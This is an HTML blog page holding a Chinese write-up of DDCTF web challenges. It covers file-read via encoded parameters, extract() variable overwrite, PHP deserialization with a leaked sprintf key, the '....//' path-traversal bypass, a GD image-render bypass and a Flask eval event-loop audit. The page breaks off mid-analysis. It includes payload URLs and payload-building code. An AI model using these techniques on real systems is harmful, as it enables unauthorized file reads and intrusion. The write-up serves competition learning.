@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>DDCTF WEB部分wp | Iuhrey的幻想乡</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言很久没打比赛了，上次被学长带着打了西湖论剑，发现他们的技术是真的牛逼，随随便便躺着就进了前30，不禁感慨实力差距太大了，为此呢，用DDCTF来练练手，借此记录一下DDCTF的一些做题思路以及所学的骚套路。 滴~打开题目，首先发现url中的jpg的值有问题，经过两次base64以及一次base16解出就是flag.jpg。那既然是这样，我们是不是可以尝试读index.php呢？编码之后输入到jp">
+<meta name="keywords" content="比赛总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF WEB部分wp">
+<meta property="og:url" content="http://yoursite.com/2019/04/17/DDCTF-WEB部分wp/index.html">
+<meta property="og:site_name" content="Iuhrey的幻想乡">
+<meta property="og:description" content="前言很久没打比赛了，上次被学长带着打了西湖论剑，发现他们的技术是真的牛逼，随随便便躺着就进了前30，不禁感慨实力差距太大了，为此呢，用DDCTF来练练手，借此记录一下DDCTF的一些做题思路以及所学的骚套路。 滴~打开题目，首先发现url中的jpg的值有问题，经过两次base64以及一次base16解出就是flag.jpg。那既然是这样，我们是不是可以尝试读index.php呢？编码之后输入到jp">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/images/26/1.png">
+<meta property="og:image" content="http://yoursite.com/images/26/2.png">
+<meta property="og:image" content="http://yoursite.com/images/26/3.png">
+<meta property="og:image" content="http://yoursite.com/images/26/4.png">
+<meta property="og:image" content="http://yoursite.com/images/26/5.png">
+<meta property="og:image" content="http://yoursite.com/images/26/6.png">
+<meta property="og:image" content="http://yoursite.com/images/26/7.png">
+<meta property="og:image" content="http://yoursite.com/images/26/8.png">
+<meta property="og:image" content="http://yoursite.com/images/26/11.png">
+<meta property="og:image" content="http://yoursite.com/images/26/12.png">
+<meta property="og:image" content="http://yoursite.com/images/26/13.png">
+<meta property="og:image" content="http://yoursite.com/images/26/14.png">
+<meta property="og:image" content="http://yoursite.com/images/26/9.png">
+<meta property="og:image" content="http://yoursite.com/images/26/10.png">
+<meta property="og:updated_time" content="2019-04-23T16:22:50.947Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF WEB部分wp">
+<meta name="twitter:description" content="前言很久没打比赛了，上次被学长带着打了西湖论剑，发现他们的技术是真的牛逼，随随便便躺着就进了前30，不禁感慨实力差距太大了，为此呢，用DDCTF来练练手，借此记录一下DDCTF的一些做题思路以及所学的骚套路。 滴~打开题目，首先发现url中的jpg的值有问题，经过两次base64以及一次base16解出就是flag.jpg。那既然是这样，我们是不是可以尝试读index.php呢？编码之后输入到jp">
+<meta name="twitter:image" content="http://yoursite.com/images/26/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="source/images/favicon.ico">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/images/avatar.jpg">
+    <h2 class="author">Iuhrey</h2>
+    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>31</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>幻想乡的起点</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>幻想乡图</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分岔路</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>路标</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-DDCTF-WEB部分wp" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/17/DDCTF-WEB部分wp/" class="article-date">
+  <time class="post-time" datetime="2019-04-17T10:57:05.000Z" itemprop="datePublished">
+    <span class="post-month">4月</span><br>
+    <span class="post-day">17</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DDCTF WEB部分wp
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没打比赛了，上次被学长带着打了西湖论剑，发现他们的技术是真的牛逼，随随便便躺着就进了前30，不禁感慨实力差距太大了，为此呢，用DDCTF来练练手，借此记录一下DDCTF的一些做题思路以及所学的骚套路。</p>
+<h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>打开题目，首先发现url中的jpg的值有问题，经过两次base64以及一次base16解出就是flag.jpg。<br>那既然是这样，我们是不是可以尝试读index.php呢？编码之后输入到jpg参数后面读取index.php。</p>
+<p><img src="/images/26/1.png" alt=""></p>
+<p>果然，解码之后得到index.php的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>提示了csdn的某篇文章，里面得到了一个文件—practice.txt.swp，读取之后发现提示了f1ag!ddctf.php，结合index.php我们可以通过config被!替换来绕过过滤，去读取该文件，文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>extract函数可导致变量覆盖，我们只要通过覆盖$k，让file_get_contents()读取不到东西返回flase，再传入uid为空，导致弱类型比较就能读取flag了，payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=xsadasdad</span><br></pre></td></tr></table></figure>
+<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>首先打开界面，审计源码可以发现/js/index.js这个关键文件，访问。</p>
+<p><img src="/images/26/2.png" alt=""></p>
+<p>可以看到我们需要爆破header中的didictf_username的值，通过爆破发现为admin。接着有个提示，提示我们访问/app/fL2XID2i0Cdh.php，这个页面给了两个文件的源码，我们可以进行审计。这里就按照解题思路讲解了。<br>首先我们可以得知../config/flag.txt中有flag。</p>
+<p><img src="/images/26/3.png" alt=""></p>
+<p>接着可以看到我们可以通过反序列化漏洞来读取文件。</p>
+<p><img src="/images/26/4.png" alt=""></p>
+<p>接着找找哪里有unserialize()函数可以利用。</p>
+<p><img src="/images/26/5.png" alt=""></p>
+<p>可以看到我们通过传入session是可以进行反序列化漏洞利用的。但是有以下两个问题。<br>第一，我们需要绕过 <strong>$hash !== md5($this-&gt;eancrykey.$session</strong> 的验证，那也就是说我们需要得知 <strong>$this-&gt;eancrykey</strong> 的值。<br>这里利用到了格式化字符串的漏洞，利用的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_POST[&quot;nickname&quot;])) &#123;</span><br><span class="line">            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);</span><br><span class="line">            $data = &quot;Welcome my friend %s&quot;;</span><br><span class="line">            foreach ($arr as $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            parent::response($data,&quot;Welcome&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>foreach循环两次，把数组中的值传入到前面的$data中，试想如果我们构造$nickname为%s，那第一次的$data是不是就变成了 <strong>Welcome my friend %s</strong> ，那第二次循环的时候，$this-&gt;eancrykey的值就传入到了$data里面，成功读取到了$this-&gt;eancrykey。</p>
+<p><img src="/images/26/6.png" alt=""></p>
+<p>第二个问题就是$path存在过滤，过滤代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>../可以通过….//来绕过。修改Application中的$path为….//config/flag.txt，按照如下生成payload。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = new Application();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$eancrykey = &quot;EzblrbNS&quot;;</span><br><span class="line">$hash = md5($eancrykey.$b);</span><br><span class="line">$session = $b.$hash;</span><br><span class="line">var_dump($session).&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>通过cookie发送构造的payload，得到flag。</p>
+<p><img src="/images/26/7.png" alt=""></p>
+<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>上传图片的时候，要求上传png/jpg/gif格式。以及源代码中需要有phpinfo()字符串。<br>通过上传一张普通图片，再下载下来可以发现一个特点。</p>
+<p><img src="/images/26/8.png" alt=""></p>
+<p>可以得知这是需要我们绕过gd库渲染。查询资料得知有如下几种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比对上传前后两次的二进制文件，找到相同的地方进行替换。</span><br><span class="line">使用jpg_payload.php</span><br></pre></td></tr></table></figure>
+<p>上传图片，把经过渲染的图片下载下来，通过比对hex找到相同点。</p>
+<p><img src="/images/26/11.png" alt=""></p>
+<p>接着将phpinfo()替换进去</p>
+<p><img src="/images/26/12.png" alt=""></p>
+<p>接着就能拿到flag了。</p>
+<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>这道题目思路挺好，而且借着这道题目学了一些flask的语法，对flask有了一定了解。<br>题目给了源码，需要的可以下载。<a href="/images/26/serve.py">serve.py</a><br>我会按照正常审计代码的思路进行一步一步讲解。毕竟我也是刚刚学的。<br>首先是关于入口的寻找。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在flask中，运行app.run()表示监听指定的端口, 对收到的request运行app生成response并返回。</span><br><span class="line">运行之后哪个函数被最先调用呢？这里我理解的是@app.route()函数之后的那一个函数。app.route()函数指定初始访问的路径，并且把得到的数据进行返回，之后的第一个函数就默认为初始函数。注意，每次进行对页面进行访问，都会调用初始函数。</span><br></pre></td></tr></table></figure>
+<p>找到了第一个函数，那我们开始审计。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def entry_point():</span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    这一步是获取url中参数，request.query_string获取的是url中?之后所有的字符串。</span><br><span class="line"></span><br><span class="line">    request.event_queue = []</span><br><span class="line">    定义一个空数组，该数组中储存即将被执行的操作。</span><br><span class="line"></span><br><span class="line">    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">        querystring = &apos;action:index;False#False&apos;</span><br><span class="line">    如果url中?之后没有任何参数，或者刚刚获取的字符串不是以action开头，或者长度大于100，那么初始化querystring为action:index;False#False</span><br><span class="line"></span><br><span class="line">    if &apos;num_items&apos; not in session:</span><br><span class="line">        session[&apos;num_items&apos;] = 0</span><br><span class="line">        session[&apos;points&apos;] = 3</span><br><span class="line">        session[&apos;log&apos;] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    如果num_items不在session中，那初始化session，session字典中的num_items代表钻石的数量，points代表的是金币数量，而log目前则用不到。</span><br><span class="line"></span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    return execute_event_loop()</span><br></pre></td></tr></table></figure>
+<p>可以看到函数最后调用了其他两个函数，先跟第一个。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(event):</span><br><span class="line">	session[&apos;log&apos;].append(event)</span><br><span class="line">        把刚刚传入的字符串添加到log中。注意此刻的log应该为list形式。</span><br><span class="line"></span><br><span class="line">	if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">        如果log列表中元素大于5个，那么只取最后5个。</span><br><span class="line">    </span><br><span class="line">	if type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	else:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line">        根据event的不同类型，将event添加进定义的event_queue</span><br></pre></td></tr></table></figure>
+<p>接着再跟第二个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">def execute_event_loop():</span><br><span class="line">	valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)</span><br><span class="line">        定义event的字符白名单</span><br><span class="line"></span><br><span class="line">	resp = None</span><br><span class="line">	while len(request.event_queue) &gt; 0:</span><br><span class="line">		event = request.event_queue[0]</span><br><span class="line">                提取event_queue第一个操作命令，赋给event</span><br><span class="line"></span><br><span class="line">		request.event_queue = request.event_queue[1:]</span><br><span class="line">                其他命令依此前进一位</span><br><span class="line"></span><br><span class="line">		if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue</span><br><span class="line">                如果event不是以action或者func开头，则提取下一位的命令操作</span><br><span class="line"></span><br><span class="line">		for c in event:</span><br><span class="line">			if c not in valid_event_chars: break</span><br><span class="line">                如果event中存在字符白名单以外的字符，则直接退出</span><br><span class="line"></span><br><span class="line">		else:</span><br><span class="line">			is_action = event[0] == &apos;a&apos;</span><br><span class="line">                        判断event的第一个字符是否为a，并且将值储存到is_action中</span><br><span class="line"></span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">                        截取event中:到;的部分字符，赋值给action   </span><br><span class="line"></span><br><span class="line">			args = get_mid_str(event, action+&apos;;&apos;).split(&apos;#&apos;)</span><br><span class="line">                        截取event中action;之后的字符并且以#进行分割，赋给args</span><br><span class="line"></span><br><span class="line">			try:</span><br><span class="line">				event_handler = eval(action + (&apos;_handler&apos; if is_action else &apos;_function&apos;))</span><br><span class="line">                                把action的值与_handler或者_function进行拼接</span><br><span class="line"></span><br><span class="line">				ret_val = event_handler(args)</span><br><span class="line">                                调用刚刚拼接的函数，对args进行处理</span><br><span class="line"></span><br><span class="line">			except RollBackException:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				resp += &apos;ERROR! All transactions have been cancelled. &lt;br /&gt;&apos;</span><br><span class="line">				resp += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">				session[&apos;num_items&apos;] = request.prev_session[&apos;num_items&apos;]</span><br><span class="line">				session[&apos;points&apos;] = request.prev_session[&apos;points&apos;]</span><br><span class="line">				break</span><br><span class="line">                        抛出错误时执行的操作</span><br><span class="line"></span><br><span class="line">			except Exception, e:</span><br><span class="line">				if resp is None: resp = &apos;&apos;</span><br><span class="line">				continue</span><br><span class="line">                        没什么意义</span><br><span class="line"></span><br><span class="line">			if ret_val is not None:</span><br><span class="line">				if resp is None: resp = ret_val</span><br><span class="line">				else: resp += ret_val</span><br><span class="line">                        如果刚刚调用的函数有回显结果，那么把结果赋给resp</span><br><span class="line"></span><br><span class="line">	if resp is None or resp == &apos;&apos;: resp = (&apos;404 NOT FOUND&apos;, 404)</span><br><span class="line">        如果无回显，页面则会显示404</span><br><span class="line"></span><br><span class="line">	session.modified = True</span><br><span class="line">	return resp</span><br><span class="line">        将最后执行的结果返回</span><br></pre></td></tr></table></figure>
+<p>整个网页的基本构造了解了，一些初始化定义的函数也详细分析了，现在开始粗略的流程分析，可以看到，当我们第一次访问页面的时候，querystring会被赋值为action:index;False#False，也就是说一开始会调用index_handler([False,False])，我们跟着看看这个函数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def index_handler(args):</span><br><span class="line">	bool_show_source = str(args[0])</span><br><span class="line">	bool_download_source = str(args[1])</span><br><span class="line">	if bool_show_source == &apos;True&apos;:</span><br><span class="line">		source = open(&apos;eventLoop.py&apos;, &apos;r&apos;)</span><br><span class="line">		html = &apos;&apos;</span><br><span class="line">		if bool_download_source != &apos;True&apos;:</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">			html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		for line in source:</span><br><span class="line">			if bool_download_source != &apos;True&apos;:</span><br><span class="line">				html += line.replace(&apos;&amp;&apos;,&apos;&amp;amp;&apos;).replace(&apos;\t&apos;, &apos;&amp;nbsp;&apos;*4).replace(&apos; &apos;,&apos;&amp;nbsp;&apos;).replace(&apos;&lt;&apos;, &apos;&amp;lt;&apos;).replace(&apos;&gt;&apos;,&apos;&amp;gt;&apos;).replace(&apos;\n&apos;, &apos;&lt;br /&gt;&apos;)</span><br><span class="line">			else:</span><br><span class="line">				html += line</span><br><span class="line">		source.close()</span><br><span class="line">		</span><br><span class="line">		if bool_download_source == &apos;True&apos;:</span><br><span class="line">			headers = &#123;&#125;</span><br><span class="line">			headers[&apos;Content-Type&apos;] = &apos;text/plain&apos;</span><br><span class="line">			headers[&apos;Content-Disposition&apos;] = &apos;attachment; filename=serve.py&apos;</span><br><span class="line">			return Response(html, headers=headers)</span><br><span class="line">		else:</span><br><span class="line">			return html</span><br><span class="line">	else:</span><br><span class="line">		trigger_event(&apos;action:view;index&apos;)</span><br><span class="line"></span><br><span class="line">这个函数主要是定义初始界面，当bool_show_source为true时，代码会打开eventLoop.py，如果bool_download_source为true会将文件进行下载，而为false的话，则是会把代码回显到页面。</span><br></pre></td></tr></table></figure>
+<p>很明显我们第一次访问，调用的是index_handler([False,False])，所以直接跳到调用view_handler(index)，我们接着跟上去看看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def view_handler(args):</span><br><span class="line">	page = args[0]</span><br><span class="line">	html = &apos;&apos;</span><br><span class="line">	html += &apos;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&apos;.format(session[&apos;num_items&apos;], session[&apos;points&apos;])</span><br><span class="line">	if page == &apos;index&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;shop&apos;:</span><br><span class="line">		html += &apos;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	elif page == &apos;reset&apos;:</span><br><span class="line">		del session[&apos;num_items&apos;]</span><br><span class="line">		html += &apos;Session reset.&lt;br /&gt;&apos;</span><br><span class="line">	html += &apos;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&apos;</span><br><span class="line">	return html</span><br><span class="line">一开始就是通过读取session中的参数值，并且回显到页面上，接着如果args为index，则给出三个功能的链接跳转按钮，如果是shop则调用buy_handler函数，如果是reset，则对session重置，接着在最后加上返回最初界面的功能键。</span><br></pre></td></tr></table></figure>
+<p>这就是初始界面的由来，其他的功能我们也不完全去分析了，现在我们该对如何拿flag进行一个分析。<br>在源码的最开头有这样一个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def FLAG():</span><br><span class="line">	return &apos;FLAG_is_here_but_i_wont_show_you&apos;  # censored</span><br></pre></td></tr></table></figure>
+<p>经过我们对前面的分析可以知道，在通过execute_event_loop()函数调用其他函数的时候，其他函数的末尾要么是_handler要么是_function，调用FLAG()函数是不可能的，我们找找有没有其他可以得到flag的方法。<br>接着发现了这样一个函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def show_flag_function(args):</span><br><span class="line">	flag = args[0]</span><br><span class="line">	#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span><br><span class="line">	return &apos;You naughty boy! ;) &lt;br /&gt;&apos;</span><br></pre></td></tr></table></figure>
+<p>可以发现我们的确可以调用这个函数，也可以利用漏洞把flag值赋值到flag变量中，但是它固定回显，并不会把flag变量给输出，所以还得继续找其他的函数。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def get_flag_handler(args):</span><br><span class="line">	if session[&apos;num_items&apos;] &gt;= 5:</span><br><span class="line">		trigger_event(&apos;func:show_flag;&apos; + FLAG()) # show_flag_function has been disabled, no worries</span><br><span class="line">	trigger_event(&apos;action:view;index&apos;)</span><br><span class="line">当我们钻石的数量大于等于5个的时候，会调用show_flag_function()函数获取通过调用FLAG()函数返回的flag值。</span><br></pre></td></tr></table></figure>
+<p>具体解释一下为什么这里调用了FLAG()，由于eval的缘故，虽然FLAG()被当作get_flag_function()函数的参数，但还是会先执行，返回的值再给get_flag_function()函数作为参数的值。<br>可以在前面trigger_event函数的定义中得知，一旦函数被执行，是会将调用结果储存到session的log中的。也就是说我们只需要满足五个钻石的条件，就可以在log中得到flag。那我们重点跟一下购买的函数。</p>
